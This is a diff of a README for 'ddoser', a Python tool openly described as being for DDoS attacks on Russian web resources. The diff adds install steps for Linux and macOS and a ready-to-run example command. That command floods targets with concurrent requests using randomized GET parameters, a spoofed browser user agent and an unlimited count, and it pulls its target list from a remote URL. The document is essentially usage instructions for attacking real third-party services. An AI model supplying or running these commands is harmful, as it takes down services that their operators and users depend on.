@@ -1,7 +1,25 @@
 # The you seddoser
 Small application for ddos attack, was developed special for kill russian's resources :)  
-## Install 
+## Install
+### Linux
 ```shell
+sudo apt install python3
+sudo apt install python3-pip
+git clone https://github.com/taransergey/ddoser.git
+cd ddoser/
+pip install -r requirements.txt
+```
+### MacOs
+Download and install python3.7-3.9 form here https://www.python.org/downloads/macos/ if you don't have it
+or install by brew
+```shell
+brew install python@3.9
+brew link python@3.9
+```
+### Common for any system
+```shell
+git clone https://github.com/taransergey/ddoser.git
+cd ddoser/
 pip install -r requirements.txt
 ```
 ## Run
@@ -33,7 +51,7 @@ ipN:portN#sock4
 ```
 ### Example cmd
 ```shell
-./ddoser.py --target-url https://some-domain.ru/ --concurrency 300 --timeout 60 --proxy-file proxy.list --count 0
+python3 ./ddoser.py --concurrency 100 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets1.txt
 ```
 ## Notes
 **ddoser** supports only sock proxy, also can start it directly without proxy
